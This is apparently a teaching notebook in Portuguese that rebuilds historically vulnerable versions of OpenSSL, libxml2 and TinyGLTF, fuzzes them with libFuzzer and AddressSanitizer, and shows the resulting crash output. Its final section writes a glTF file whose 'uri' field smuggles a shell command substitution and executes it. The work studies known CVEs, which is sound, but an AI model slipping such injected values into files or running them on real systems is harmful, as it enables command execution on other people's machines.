# Caçando Bugs Invisíveis em Escala
**Como Compiladores, Fuzzers e Agentes Protegem o Código que Move a Internet**

Execute a célula de **Setup do Ambiente** abaixo uma única vez antes de rodar os cenários.


In [ ]:
# @title Setup do Ambiente (Execute esta celula primeiro - leva ~1.5 a 2 min no Colab gratuito)
import os, subprocess, shutil, sys

def run_live(cmd):
    proc = subprocess.Popen(['bash', '-c', cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in proc.stdout:
        print(line, end='', flush=True)
    proc.wait()
    if proc.returncode != 0:
        raise subprocess.CalledProcessError(proc.returncode, cmd)

print('[1/3] Verificando toolchain LLVM/Clang e pacotes de build...', flush=True)
os.makedirs('/tmp/usp_lab/bin', exist_ok=True)
os.makedirs('/tmp/usp_lab/repos', exist_ok=True)

for _link in ('/tmp/usp_lab/bin/clang', '/tmp/usp_lab/bin/clang++', '/usr/local/bin/clang', '/usr/local/bin/clang++'):
    if os.path.islink(_link) and not os.path.exists(_link):
        os.unlink(_link)

clean_path = ':'.join(p for p in os.environ.get('PATH', '').split(':') if p not in ('/tmp/usp_lab/bin', '/usr/local/bin')) + ':/usr/lib/llvm-19/bin:/usr/lib/llvm-18/bin:/usr/lib/llvm-15/bin:/usr/lib/llvm-14/bin'
CLANG = shutil.which('clang', path=clean_path) or '/usr/bin/clang'
CLANGXX = shutil.which('clang++', path=clean_path) or '/usr/bin/clang++'

need_apt = False
for tool in [CLANG, CLANGXX, 'autoreconf', 'libtoolize', 'autopoint', 'tclsh', 'gdb']:
    if not shutil.which(tool, path=clean_path) and not os.path.exists(tool):
        need_apt = True
        break
if not need_apt:
    r_fuzz = subprocess.run(
        [CLANG, '-fsanitize=fuzzer,address', '-x', 'c', '-', '-o', '/tmp/usp_lab/test_fuzzer'],
        input='int LLVMFuzzerTestOneInput(const char *d, long s){return 0;}',
        capture_output=True, text=True
    )
    if r_fuzz.returncode != 0:
        need_apt = True

if need_apt:
    print('  -> Instalando clang, libfuzzer e autotools via apt-get...', flush=True)
    subprocess.run(
        'DEBIAN_FRONTEND=noninteractive apt-get update -qq && '
        'DEBIAN_FRONTEND=noninteractive apt-get install -y -qq clang llvm lld '
        'git build-essential autoconf automake libtool pkg-config gettext autopoint '
        'zlib1g-dev liblzma-dev tcl tcl-dev gdb python3',
        shell=True, check=True
    )
    CLANG = shutil.which('clang', path=clean_path) or '/usr/bin/clang'
    CLANGXX = shutil.which('clang++', path=clean_path) or '/usr/bin/clang++'
    subprocess.run(
        f'VER=$({CLANG} --version 2>/dev/null | grep -oE "version [0-9]+" | head -n1 | awk "{{print \$2}}"); '
        'if [ -n "$VER" ]; then DEBIAN_FRONTEND=noninteractive apt-get install -y -qq libclang-rt-${VER}-dev libfuzzer-${VER}-dev 2>/dev/null || true; fi; '
        'DEBIAN_FRONTEND=noninteractive apt-get install -y -qq libclang-rt-14-dev 2>/dev/null || true',
        shell=True
    )
    r_check = subprocess.run(
        [CLANG, '-fsanitize=fuzzer,address', '-x', 'c', '-', '-o', '/tmp/usp_lab/test_fuzzer'],
        input='int LLVMFuzzerTestOneInput(const char *d, long s){return 0;}',
        capture_output=True, text=True
    )
    if r_check.returncode != 0 and os.path.exists('/usr/bin/clang-14'):
        CLANG = '/usr/bin/clang-14'
        CLANGXX = '/usr/bin/clang++-14'

# IMPORTANTE: Nunca usar os.path.realpath em clang++, pois clang++ e um symlink para clang
# e o LLVM decide entre modo C e modo C++ (-lstdc++) olhando para argv[0] ('clang++')!
CLANG = os.path.realpath(CLANG)
if os.path.exists(CLANG + '++'):
    CLANGXX = CLANG + '++'
elif not CLANGXX.endswith('++'):
    CLANGXX = '/usr/bin/clang++'

subprocess.run(f'ln -sf {CLANG} /tmp/usp_lab/bin/clang && ln -sf {CLANGXX} /tmp/usp_lab/bin/clang++', shell=True, check=True)
subprocess.run(f'if [ -w /usr/local/bin ]; then ln -sf {CLANG} /tmp/usp_lab/bin/clang && ln -sf {CLANGXX} /usr/local/bin/clang++; fi', shell=True)
os.environ['PATH'] = '/tmp/usp_lab/bin:' + clean_path

print('[2/3] Clonando repositorios nas tags/commits vulneraveis...', flush=True)
clone_script = '''
set -e
cd /tmp/usp_lab/repos

if [ ! -d fuzzer-test-suite ]; then
  git clone -q --depth 1 --filter=blob:none --sparse https://github.com/google/fuzzer-test-suite.git fuzzer-test-suite
  (cd fuzzer-test-suite && git sparse-checkout set openssl-1.0.1f libxml2-v2.9.2 c-ares-CVE-2016-5180)
fi

if [ ! -d openssl ]; then
  git clone -q --depth 1 --branch OpenSSL_1_0_1f https://github.com/openssl/openssl.git openssl
fi

if [ ! -d libxml2 ]; then
  git clone -q --depth 1 --branch v2.9.2 https://github.com/GNOME/libxml2.git libxml2
fi

if [ ! -f tinygltf/tiny_gltf.h ] || [ ! -f tinygltf/loader_example.cc ]; then
  rm -rf tinygltf
  git clone -q --depth 1 --branch v2.5.0 https://github.com/syoyo/tinygltf.git tinygltf
fi

if [ ! -d c-ares ]; then
  git clone -q --depth 1 --branch cares-1_11_0 https://github.com/c-ares/c-ares.git c-ares
fi

if [ ! -d xz ]; then
  git clone -q --depth 1 --branch v5.6.0 https://github.com/tukaani-project/xz.git xz
fi

if [ ! -d sqlite ]; then
  git clone -q --depth 1 --branch version-3.46.0 https://github.com/sqlite/sqlite.git sqlite
  (cd sqlite && git fetch -q --depth 1 origin 5804da02182927dafae24a83bfe4176bb1746118 && git checkout 5804da02182927dafae24a83bfe4176bb1746118 -- ext/misc/series.c test/ossfuzz.c)
fi
'''
run_live(clone_script)

print('[3/3] Compilando os projetos com instrumentacao ASan + SanitizerCoverage...', flush=True)
prebuild_script = f'''
set -e
export CLANG="{CLANG}"
export CLANGXX="{CLANGXX}"
export CC="$CLANG -g -O1 -fsanitize=fuzzer-no-link,address -fno-omit-frame-pointer -Wno-error"
export CXX="$CLANGXX -g -O1 -fsanitize=fuzzer-no-link,address -fno-omit-frame-pointer -Wno-error"
export CC_FAST="$CLANG -O0 -fno-omit-frame-pointer -Wno-error"

# 1 & 3. OpenSSL 1.0.1f (Fast prebuild for 2-vCPU Colab + Full ASan/Cov on ssl/ & crypto/bn/)
cp -rf /tmp/usp_lab/repos/fuzzer-test-suite/openssl-1.0.1f/runtime /tmp/usp_lab/runtime
if [ ! -f /tmp/usp_lab/repos/openssl/libssl.a ] || [ ! -f /tmp/usp_lab/repos/openssl/libcrypto.a ]; then
  echo "  -> [1/6] OpenSSL 1.0.1f..."
  cd /tmp/usp_lab/repos/openssl
  CC_OSSL_FAST="$CC_FAST -Ulinux -DTERMIOS -DBN_LLONG"
  CC_OSSL_ASAN="$CC -Ulinux -DTERMIOS -DBN_LLONG"
  ./config no-shared no-asm no-hw no-engines >/dev/null
  make CC="$CC_OSSL_FAST" links >/dev/null
  make -C crypto CC="$CC_OSSL_FAST" buildinf.h >/dev/null
  make -C crypto -j$(nproc) CC="$CC_OSSL_FAST" INCLUDES="-I. -I.. -I../include" top >/dev/null 2>&1 || true
  for d in crypto/*/; do
    make -C "$d" -j$(nproc) CC="$CC_OSSL_FAST" INCLUDES="-I.. -I../.. -I../modes -I../asn1 -I../evp -I../../include" lib >/dev/null 2>&1 || true
  done
  # Instrumenta os submodulos alvo (bn, bio, buffer, stack, lhash, err, evp) e todo o ssl/ com ASan + SanitizerCoverage
  for d in crypto/bn crypto/bio crypto/buffer crypto/stack crypto/lhash crypto/err; do
    rm -f "$d"/*.o
    make -C "$d" -j$(nproc) CC="$CC_OSSL_ASAN" INCLUDES="-I.. -I../.. -I../modes -I../asn1 -I../evp -I../../include" lib >/dev/null 2>&1 || true
  done
  make -C ssl -j$(nproc) CC="$CC_OSSL_ASAN" INCLUDES="-I../crypto -I.. -I../include" lib >/dev/null 2>&1 || true
  ar d libcrypto.a bn_asm.o 2>/dev/null || true
  $CC_OSSL_ASAN -DSIXTY_FOUR_BIT_LONG -I. -Icrypto -Iinclude -c crypto/bn/asm/x86_64-gcc.c -o crypto/bn/asm/x86_64-gcc.o
  ar rcs libcrypto.a $(find crypto -name '*.o' ! -name 'bn_asm.o') crypto/bn/asm/x86_64-gcc.o
  ar rcs libssl.a $(find ssl -name '*.o')
fi

rm -rf /tmp/usp_lab/seeds_openssl && mkdir -p /tmp/usp_lab/seeds_openssl
printf "\\x18\\x03\\x01\\x00\\x03\\x01\\x00\\x00" > /tmp/usp_lab/seeds_openssl/valid_heartbeat.bin

rm -rf /tmp/usp_lab/seeds_bn && mkdir -p /tmp/usp_lab/seeds_bn
python3 -c 'b=bytearray.fromhex("138000000000000001fffffffffffffffffffffffffffffffe"); open("/tmp/usp_lab/seeds_bn/seed1.bin","wb").write(b)'

# 2. libxml2 v2.9.2 (Slim configure for fast 2-vCPU compilation)
if [ ! -f /tmp/usp_lab/repos/libxml2/.libs/libxml2.a ]; then
  echo "  -> [2/6] libxml2 v2.9.2..."
  cd /tmp/usp_lab/repos/libxml2
  git sparse-checkout disable 2>/dev/null || true
  NOCONFIGURE=1 ./autogen.sh >/dev/null 2>&1 || autoreconf -fi >/dev/null 2>&1
  ./configure --without-python --without-threads --without-lzma --without-zlib \
    --without-ftp --without-http --without-legacy --without-iconv --without-icu \
    --without-docbook --without-schemas --without-schematron --without-modules \
    --without-debug --without-catalog --disable-shared --enable-static >/dev/null 2>&1
  make -j$(nproc) libxml2.la >/dev/null 2>&1
fi
rm -rf /tmp/usp_lab/seeds_libxml2 && mkdir -p /tmp/usp_lab/seeds_libxml2
python3 -c 'open("/tmp/usp_lab/seeds_libxml2/seed1.xml","wb").write(bytes.fromhex("fffeeeee76d83c3f786d6c207665726976d83c3f786d6c2076657273696f6e3d22312e30223f3e"))'

# 4. TinyGLTF v2.5.0
if [ ! -f /tmp/usp_lab/bin/loader_example ]; then
  echo "  -> [3/6] TinyGLTF v2.5.0..."
  $CLANGXX -g -O1 -fsanitize=address -I/tmp/usp_lab/repos/tinygltf /tmp/usp_lab/repos/tinygltf/loader_example.cc -o /tmp/usp_lab/bin/loader_example
fi
head -c 16 /dev/zero > /tmp/usp_lab/mesh.bin

# 5. c-ares 1.11.0
if [ ! -f /tmp/usp_lab/repos/c-ares/.libs/libcares.a ]; then
  echo "  -> [4/6] c-ares 1.11.0..."
  cd /tmp/usp_lab/repos/c-ares
  git sparse-checkout disable 2>/dev/null || true
  ./buildconf >/dev/null 2>&1 || autoreconf -fi >/dev/null 2>&1
  ./configure --disable-shared --enable-static >/dev/null 2>&1
  make -j$(nproc) libcares.la >/dev/null 2>&1
fi
cd /tmp/usp_lab/repos/c-ares && $CC -DHAVE_CONFIG_H -I. -c ares_create_query.c -o /tmp/usp_lab/repos/cares_create_query.o

# 6. XZ Utils v5.6.0
if [ ! -f /tmp/usp_lab/repos/xz/src/liblzma/.libs/liblzma.a ]; then
  echo "  -> [5/6] XZ Utils v5.6.0..."
  cd /tmp/usp_lab/repos/xz
  git sparse-checkout disable 2>/dev/null || true
  rm -f src/liblzma/liblzma.la
  ./autogen.sh --no-po4a --no-doxygen >/dev/null 2>&1 || autoreconf -fi >/dev/null 2>&1
  ./configure --disable-shared --enable-static --disable-xz --disable-xzdec --disable-lzmadec --disable-lzmainfo --disable-scripts --disable-doc >/dev/null 2>&1
  make -j$(nproc) -C src/liblzma >/dev/null 2>&1
fi

# 7. SQLite Commit 5804da021 (Fast -O0 on sqlite3.c core + Full ASan/Cov on series.c)
if [ ! -f /tmp/usp_lab/repos/sqlite3_core.o ]; then
  echo "  -> [6/6] SQLite Commit 5804da021..."
  cd /tmp/usp_lab/repos/sqlite
  if [ ! -f sqlite3.c ]; then
    ./configure >/dev/null 2>&1
    make sqlite3.c >/dev/null 2>&1
  fi
  $CLANG -O0 -DSQLITE_THREADSAFE=0 -DSQLITE_OMIT_LOAD_EXTENSION=1 -I/tmp/usp_lab/repos/sqlite -c /tmp/usp_lab/repos/sqlite/sqlite3.c -o /tmp/usp_lab/repos/sqlite3_core.o
fi
$CC -DNDEBUG -DSQLITE_CORE -I/tmp/usp_lab/repos/sqlite -c /tmp/usp_lab/repos/sqlite/ext/misc/series.c -o /tmp/usp_lab/repos/sqlite_series.o
mkdir -p /tmp/usp_lab/seeds_sqlite
rm -f /tmp/usp_lab/seeds_sqlite/*
printf "\\xfd\\nSELECT * FROM generate_series(1,5) WHERE rowid>1;" > /tmp/usp_lab/seeds_sqlite/seed1.sql
printf '"="\n"rowid="\n' > /tmp/usp_lab/sql.dict
'''
run_live(prebuild_script)

print('Ambiente configurado com sucesso! Repositorios e targets prontos em /tmp/usp_lab/repos/:', flush=True)
for repo in ['fuzzer-test-suite', 'openssl', 'libxml2', 'tinygltf', 'c-ares', 'xz', 'sqlite']:
    out = subprocess.check_output(['git', '-C', f'/tmp/usp_lab/repos/{repo}', 'log', '-1', '--oneline'], text=True).strip()
    print(f'  - {repo:18s}: {out}', flush=True)


[1/3] Verificando toolchain LLVM/Clang e pacotes de build...
  -> Instalando clang, libfuzzer e autotools via apt-get...


<>:50: SyntaxWarning: invalid escape sequence '\$'
<>:50: SyntaxWarning: invalid escape sequence '\$'
/tmp/ipykernel_1860/2234030964.py:50: SyntaxWarning: invalid escape sequence '\$'
  f'VER=$({CLANG} --version 2>/dev/null | grep -oE "version [0-9]+" | head -n1 | awk "{{print \$2}}"); '


[2/3] Clonando repositorios nas tags/commits vulneraveis...
Note: switching to '0d8776344cd7965fadd870e361503985df9c45bb'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

Note: switching to '726f67e2f140f8d936dfe993bf9ded3180d750d2'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (

---
## 1. OpenSSL
- **Vulnerabilidade**: `CVE-2014-0160` (Heartbleed)
- **Repositorio / Tag**: `openssl/openssl` (`OpenSSL_1_0_1f`)
- **Target**: `google/fuzzer-test-suite/openssl-1.0.1f/target.cc`
- **Bug**: `ssl/t1_lib.c:2586` (`tls1_process_heartbeat`). `n2s(p, payload)` le o tamanho declarado na mensagem TLS Heartbeat (16 bits, ate 65535 bytes) e executa `memcpy(bp, pl, payload)` sem validar se `1 + 2 + payload + 16 <= s->s3->rrec.length`.
- **Seed / Corpus (`/tmp/usp_lab/seeds_openssl`)**: Contem 1 pacote TLS 1.0 Heartbeat valido de 8 bytes (`18 03 01 00 03 01 00 00`) com `payload_length = 0` (que nao falha). Sem essa semente inicial, o fuzzer gastaria milhares de tentativas ate acertar no escuro o cabecalho TLS (`18 03 01`); partindo da semente valida, basta 1 mutacao nos bytes de tamanho para o `libFuzzer` disparar o `heap-buffer-overflow`.

In [ ]:
#@title Target (target.cc) {display-mode: "form"}
%%writefile /tmp/usp_lab/1_openssl_official_target.cc
// Copyright 2016 Google Inc. All Rights Reserved.
// Distributed under the Apache License, Version 2.0.
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <assert.h>
#include <stdint.h>
#include <stddef.h>

SSL_CTX *Init() {
  SSL_library_init();
  SSL_load_error_strings();
  ERR_load_BIO_strings();
  OpenSSL_add_all_algorithms();
  SSL_CTX *sctx;
  assert(sctx = SSL_CTX_new(TLSv1_method()));
  assert(SSL_CTX_use_certificate_file(sctx, "/tmp/usp_lab/runtime/server.pem", SSL_FILETYPE_PEM));
  assert(SSL_CTX_use_PrivateKey_file(sctx, "/tmp/usp_lab/runtime/server.key", SSL_FILETYPE_PEM));
  return sctx;
}

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  static SSL_CTX *sctx = Init();
  SSL *server = SSL_new(sctx);
  BIO *sinbio = BIO_new(BIO_s_mem());
  BIO *soutbio = BIO_new(BIO_s_mem());
  SSL_set_bio(server, sinbio, soutbio);
  SSL_set_accept_state(server);
  BIO_write(sinbio, Data, Size);
  SSL_do_handshake(server);
  SSL_free(server);
  return 0;
}


Writing /tmp/usp_lab/1_openssl_official_target.cc


In [ ]:
%%bash
# Exibe as linhas 2553-2590 de ssl/t1_lib.c onde ocorre o memcpy sem validacao de tamanho
nl -ba /tmp/usp_lab/repos/openssl/ssl/t1_lib.c | sed -n '2553,2590p'

# Compila o target oficial com libFuzzer + AddressSanitizer linkando contra libssl.a e libcrypto.a
clang++ -g -O1 -fsanitize=fuzzer,address \
  -I/tmp/usp_lab/repos/openssl/include \
  /tmp/usp_lab/1_openssl_official_target.cc \
  /tmp/usp_lab/repos/openssl/libssl.a \
  /tmp/usp_lab/repos/openssl/libcrypto.a -ldl \
  -o /tmp/usp_lab/bin/1_openssl_official_fuzzer

# Executa o fuzzer passando o Seed Corpus (/tmp/usp_lab/seeds_openssl)
/tmp/usp_lab/bin/1_openssl_official_fuzzer -artifact_prefix=/tmp/usp_lab/ /tmp/usp_lab/seeds_openssl || true


  2553	int
  2554	tls1_process_heartbeat(SSL *s)
  2555		{
  2556		unsigned char *p = &s->s3->rrec.data[0], *pl;
  2557		unsigned short hbtype;
  2558		unsigned int payload;
  2559		unsigned int padding = 16; /* Use minimum padding */
  2560	
  2561		/* Read type and payload length first */
  2562		hbtype = *p++;
  2563		n2s(p, payload);
  2564		pl = p;
  2565	
  2566		if (s->msg_callback)
  2567			s->msg_callback(0, s->version, TLS1_RT_HEARTBEAT,
  2568				&s->s3->rrec.data[0], s->s3->rrec.length,
  2569				s, s->msg_callback_arg);
  2570	
  2571		if (hbtype == TLS1_HB_REQUEST)
  2572			{
  2573			unsigned char *buffer, *bp;
  2574			int r;
  2575	
  2576			/* Allocate memory for the response, size is 1 bytes
  2577			 * message type, plus 2 bytes payload length, plus
  2578			 * payload, plus padding
  2579			 */
  2580			buffer = OPENSSL_malloc(1 + 2 + payload + padding);
  2581			bp = buffer;
  2582			
  2583			/* Enter response type, length and copy payload */
  2584			*bp++ = TLS

INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 968447839
INFO: Loaded 1 modules   (12087 inline 8-bit counters): 12087 [0x5603b466f5e0, 0x5603b4672517), 
INFO: Loaded 1 PC tables (12087 PCs): 12087 [0x5603b4672518,0x5603b46a1888), 
INFO:        1 files found in /tmp/usp_lab/seeds_openssl
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: seed corpus: files: 1 min: 8b max: 8b total: 8b rss: 38Mb
#2	INITED cov: 334 ft: 335 corp: 1/8b exec/s: 0 rss: 39Mb
	NEW_FUNC[1/1]: 0x5603b448ee10 in ERR_put_error /tmp/usp_lab/repos/openssl/crypto/err/err.c:708
#3	NEW    cov: 339 ft: 374 corp: 2/14b lim: 8 exec/s: 0 rss: 39Mb L: 6/8 MS: 1 EraseBytes-
#14	NEW    cov: 346 ft: 387 corp: 3/22b lim: 8 exec/s: 0 rss: 40Mb L: 8/8 MS: 1 CrossOver-
==41096==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x529000009748 at pc 0x5603b437ed46 bp 0x7ffd34e88da0 sp 0x7ffd34e88560
READ of size 33022 at 0x529000009748 thread T0
    #0 0x5603b4

---
## 2. libxml2
- **Vulnerabilidade**: `CVE-2015-8317` (Out-of-Bounds Heap Read em `xmlParseXMLDecl`)
- **Repositorio / Tag**: `GNOME/libxml2` (`v2.9.2`)
- **Target**: `google/fuzzer-test-suite/libxml2-v2.9.2/target.cc`
- **Bug**: `parser.c:10666` (`xmlParseXMLDecl`). Quando a conversao de encoding UTF-16 (`\xff\xfe`) falha em uma declaracao `<?xml ...` incompleta, `xmlFatalErr` registra o erro mas nao retorna da funcao, executando `MOVETO_ENDTAG(CUR_PTR)` alem do fim do buffer no heap.
- **Seed / Corpus (`/tmp/usp_lab/seeds_libxml2`)**: Contem 1 declaracao `<?xml version="1.0"?>` com BOM UTF-16LE (`\xff\xfe`) fechada corretamente com `?>` (que nao falha). O Seed Corpus coloca o fuzzer diretamente na rotina de conversao UTF-16; quando o `libFuzzer` corrompe o fechamento `?>`, o ASan detecta a leitura fora dos limites na linha 10666.

In [ ]:
#@title Target (target.cc) {display-mode: "form"}
%%writefile /tmp/usp_lab/2_libxml2_official_target.cc
// Copyright 2016 Google Inc. All Rights Reserved.
// Distributed under the Apache License, Version 2.0.
#include <cstdint>
#include <string>
#include <vector>
#include "libxml/xmlversion.h"
#include "libxml/parser.h"
#include "libxml/HTMLparser.h"
#include "libxml/tree.h"

void ignore(void *ctx, const char *msg, ...) {}

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
  xmlSetGenericErrorFunc(NULL, &ignore);
  if (auto doc = xmlReadMemory(reinterpret_cast<const char *>(data), size,
                               "noname.xml", NULL, 0))
    xmlFreeDoc(doc);
  return 0;
}


Writing /tmp/usp_lab/2_libxml2_official_target.cc


In [ ]:
%%bash
# Exibe as linhas 10655-10670 de parser.c (xmlParseXMLDecl)
nl -ba /tmp/usp_lab/repos/libxml2/parser.c | sed -n '10655,10670p'

# Compila o target oficial contra libxml2.a com libFuzzer + AddressSanitizer
clang++ -g -O1 -fsanitize=fuzzer,address \
  -I/tmp/usp_lab/repos/libxml2/include \
  /tmp/usp_lab/2_libxml2_official_target.cc \
  /tmp/usp_lab/repos/libxml2/.libs/libxml2.a \
  -o /tmp/usp_lab/bin/2_libxml2_official_fuzzer

# Executa o fuzzer passando o Seed Corpus (/tmp/usp_lab/seeds_libxml2)
/tmp/usp_lab/bin/2_libxml2_official_fuzzer -detect_leaks=0 -artifact_prefix=/tmp/usp_lab/ /tmp/usp_lab/seeds_libxml2 || true


 10655	    ctxt->input->standalone = xmlParseSDDecl(ctxt);
 10656	
 10657	    SKIP_BLANKS;
 10658	    if ((RAW == '?') && (NXT(1) == '>')) {
 10659	        SKIP(2);
 10660	    } else if (RAW == '>') {
 10661	        /* Deprecated old WD ... */
 10662		xmlFatalErr(ctxt, XML_ERR_XMLDECL_NOT_FINISHED, NULL);
 10663		NEXT;
 10664	    } else {
 10665		xmlFatalErr(ctxt, XML_ERR_XMLDECL_NOT_FINISHED, NULL);
 10666		MOVETO_ENDTAG(CUR_PTR);
 10667		NEXT;
 10668	    }
 10669	}
 10670	


INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2715575937
INFO: Loaded 1 modules   (31150 inline 8-bit counters): 31150 [0x5620b7a4d468, 0x5620b7a54e16), 
INFO: Loaded 1 PC tables (31150 PCs): 31150 [0x5620b7a54e18,0x5620b7ace8f8), 
INFO:        1 files found in /tmp/usp_lab/seeds_libxml2
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: seed corpus: files: 1 min: 39b max: 39b total: 39b rss: 34Mb
==41113==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x521000003900 at pc 0x5620b77fe0e7 bp 0x7ffdacf85070 sp 0x7ffdacf85068
READ of size 1 at 0x521000003900 thread T0
    #0 0x5620b77fe0e6 in xmlParseXMLDecl /tmp/usp_lab/repos/libxml2/parser.c:10666:2
    #1 0x5620b77ff603 in xmlParseDocument /tmp/usp_lab/repos/libxml2/parser.c:10771:2
    #2 0x5620b7818f58 in xmlDoRead /tmp/usp_lab/repos/libxml2/parser.c:15298:5
    #3 0x5620b77a67c7 in LLVMFuzzerTestOneInput /tmp/usp_lab/2_libxml2_official_target.cc:15:18
    #

---
## 3. OpenSSL
- **Vulnerabilidade**: `CVE-2015-3193` (Carry-Bit Bug em `BN_sqr` vs `BN_mul`)
- **Repositorio / Tag**: `openssl/openssl` (`OpenSSL_1_0_1f`)
- **Target**: `openssl/fuzz/bignum.c`
- **Bug**: `crypto/bn/bn_sqr.c:132-152` e `crypto/bn/asm/x86_64-gcc.c`. Erro de propagacao de carry no calculo de quadrados (`BN_sqr`). Como nao ha corrupcao de memoria, o bug e capturado via *Differential Fuzzing* comparando `BN_sqr(r_sqr, b1)` contra `BN_mul(r_mul, b1, b1)` (`assert(BN_cmp(r_sqr, r_mul) == 0)`).
- **Seed / Corpus (`/tmp/usp_lab/seeds_bn`)**: Contem um inteiro `BIGNUM` de 25 bytes com `byte[0] = 0x13` onde `BN_sqr(x) == BN_mul(x, x)` (nao falha na semente). Como a falha de carry ocorre em apenas $\approx 2^{-128}$ das entradas possiveis, a semente posiciona os bits inferiores na fronteira de carry; quando o `libFuzzer` altera o primeiro byte (`0x13 -> 0xff`), o carry transborda e o `assert` diferencial captura a divergencia.

In [ ]:
#@title Target (bignum.c) {display-mode: "form"}
%%writefile /tmp/usp_lab/3_bn_sqr_official_target.cc
// OpenSSL BIGNUM differential fuzzing target (openssl/fuzz/bignum.c)
#include <openssl/bn.h>
#include <openssl/err.h>
#include <assert.h>
#include <stdint.h>
#include <stddef.h>

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  if (Size < 1) return 0;
  BN_CTX *ctx = BN_CTX_new();
  BIGNUM *b1 = BN_new();
  BIGNUM *r_sqr = BN_new();
  BIGNUM *r_mul = BN_new();

  BN_bin2bn(Data, Size, b1);
  BN_sqr(r_sqr, b1, ctx);
  BN_mul(r_mul, b1, b1, ctx);

  // Differential oracle: BN_sqr(b1) must equal BN_mul(b1, b1)
  assert(BN_cmp(r_sqr, r_mul) == 0);

  BN_free(b1);
  BN_free(r_sqr);
  BN_free(r_mul);
  BN_CTX_free(ctx);
  return 0;
}


Writing /tmp/usp_lab/3_bn_sqr_official_target.cc


In [ ]:
%%bash
# Exibe as linhas 132-152 de crypto/bn/bn_sqr.c
nl -ba /tmp/usp_lab/repos/openssl/crypto/bn/bn_sqr.c | sed -n '132,152p'

# Compila o target diferencial contra libcrypto.a com libFuzzer + AddressSanitizer
clang++ -g -O1 -fsanitize=fuzzer,address \
  -I/tmp/usp_lab/repos/openssl/include \
  /tmp/usp_lab/3_bn_sqr_official_target.cc \
  /tmp/usp_lab/repos/openssl/libcrypto.a \
  -o /tmp/usp_lab/bin/3_bn_sqr_official_fuzzer

# Executa o fuzzer diferencial passando o Seed Corpus (/tmp/usp_lab/seeds_bn)
/tmp/usp_lab/bin/3_bn_sqr_official_fuzzer -max_len=64 -artifact_prefix=/tmp/usp_lab/ /tmp/usp_lab/seeds_bn || true


   132					bn_sqr_normal(rr->d,a->d,al,tmp->d);
   133					}
   134				}
   135	#else
   136			if (bn_wexpand(tmp,max) == NULL) goto err;
   137			bn_sqr_normal(rr->d,a->d,al,tmp->d);
   138	#endif
   139			}
   140	
   141		rr->neg=0;
   142		/* If the most-significant half of the top word of 'a' is zero, then
   143		 * the square of 'a' will max-1 words. */
   144		if(a->d[al - 1] == (a->d[al - 1] & BN_MASK2l))
   145			rr->top = max - 1;
   146		else
   147			rr->top = max;
   148		if (rr != r) BN_copy(r,rr);
   149		ret = 1;
   150	 err:
   151		bn_check_top(rr);
   152		bn_check_top(tmp);


INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 3468092303
INFO: Loaded 1 modules   (2243 inline 8-bit counters): 2243 [0x585314aeaa00, 0x585314aeb2c3), 
INFO: Loaded 1 PC tables (2243 PCs): 2243 [0x585314aeb2c8,0x585314af3ef8), 
INFO:        1 files found in /tmp/usp_lab/seeds_bn
INFO: seed corpus: files: 1 min: 25b max: 25b total: 25b rss: 31Mb
3_bn_sqr_official_fuzzer: /tmp/usp_lab/3_bn_sqr_official_target.cc:20: int LLVMFuzzerTestOneInput(const uint8_t *, size_t): Assertion `BN_cmp(r_sqr, r_mul) == 0' failed.
==41126== ERROR: libFuzzer: deadly signal
    #0 0x585314a25b45 in __sanitizer_print_stack_trace (/tmp/usp_lab/bin/3_bn_sqr_official_fuzzer+0x12bb45) (BuildId: 3118a49778b629141aef6967289551182e863873)
    #1 0x58531497f65c in fuzzer::PrintStackTrace() (/tmp/usp_lab/bin/3_bn_sqr_official_fuzzer+0x8565c) (BuildId: 3118a49778b629141aef6967289551182e863873)
    #2 0x5853149656e7 in fuzzer::Fuzzer::CrashCallback() (/tmp/usp_lab/bin/3_bn_sqr_official_fuzzer+0x6b

---
## 4. TinyGLTF
- **Vulnerabilidade**: `CVE-2022-3008` (Command Injection via `wordexp`)
- **Repositorio / Tag**: `syoyo/tinygltf` (`v2.5.0`)
- **Bug**: `tiny_gltf.h:2641` (`ExpandFilePath`). Ao abrir um arquivo 3D `.gltf`, o campo `"uri"` de `"buffers"` e envolvido em aspas duplas (`"\"" + filepath + "\""`) e passado para `wordexp(quoted_path.c_str(), &p, 0)` da `glibc` sem a flag `WRDE_NOCMD`. Com isso, qualquer substituicao de comando (`$(...)`, crases ou `;`) dentro da `"uri"` no arquivo `.gltf` abaixo e executada pelo `/bin/sh` sem corromper memoria (invisivel ao AddressSanitizer).

In [ ]:
%%writefile /tmp/usp_lab/exploit.gltf
{
  "asset": {
    "version": "2.0"
  },
  "buffers": [
    {
      "uri": "$(whoami > /tmp/usp_lab/pwned.txt; uname -sr >> /tmp/usp_lab/pwned.txt; echo mesh.bin)",
      "byteLength": 16
    }
  ]
}


Writing /tmp/usp_lab/exploit.gltf


In [ ]:
%%bash
cd /tmp/usp_lab
rm -f /tmp/usp_lab/pwned.txt
head -c 16 /dev/zero > /tmp/usp_lab/mesh.bin

# Dispara o exploit: o loader oficial do TinyGLTF abre o exploit.gltf e executa o comando da "uri" via wordexp()
/tmp/usp_lab/bin/loader_example /tmp/usp_lab/exploit.gltf

echo "[!] Conteudo gravado pelo comando injetado em /tmp/usp_lab/pwned.txt:"
cat /tmp/usp_lab/pwned.txt


Reading ASCII glTF
=== Dump glTF ===
asset.copyright          : 
asset.generator          : 
asset.version            : 2.0
asset.minVersion         : 

=== Dump scene ===
defaultScene: -1
scenes(items=0)
